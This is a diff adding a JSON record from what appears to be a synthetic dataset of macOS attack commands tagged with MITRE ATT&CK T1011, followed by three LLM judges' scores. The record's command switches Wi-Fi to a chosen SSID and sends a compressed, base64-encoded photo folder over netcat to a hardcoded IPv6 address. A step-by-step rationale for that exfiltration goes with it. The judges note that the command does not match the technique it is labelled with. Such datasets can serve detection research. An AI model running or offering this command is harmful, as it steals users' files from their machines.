@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
+  "explanation": "Targets a specific 5 GHz channel, joins an alternate SSID, and exfiltrates a compressed photo set via IPv6 UDP to a high port. This keeps traffic on an uncommon wireless medium separate from the primary channel per T1011.",
+  "rationale_steps": [
+    "Disassociate from current Wi\u2011Fi.",
+    "Hint the adapter to a less common 5 GHz channel.",
+    "Join an off-network SSID intended for exfil.",
+    "Compress, encode, and transmit via IPv6 UDP on a high port scoped to Wi\u2011Fi."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-b764478a",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct piping syntax for the exfiltration chain.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does perform exfiltration over an alternate network channel, it doesn't implement dynamic resolution as described in T1011 since it uses a hardcoded IPv6 address rather than algorithmically determining endpoints.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:31:11.890534Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct command separators, properly quoted strings, valid flags, and a syntactically correct link-local IPv6 address with scope ID.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command plausibly reconfigures Wi-Fi and exfiltrates data, it does not demonstrate any dynamic resolution of network endpoints as defined by MITRE ATT&CK T1011, instead using a hardcoded IPv6 address.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:31:24.699348Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, correct chaining via && and pipes, and plausible flags for airport, networksetup, tar, base64, and nc.",
+        "semantic_score": 1,
+        "semantic_justification": "It joins a specific SSID and exfiltrates data via IPv6 UDP to a static address but implements no dynamic endpoint generation or DNS-based resolution (no DGA/rotation/TTL churn) and also relies on sudo despite 'Privilege: None', so it does not realize the described T1011 behavior.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:32:07.455913Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
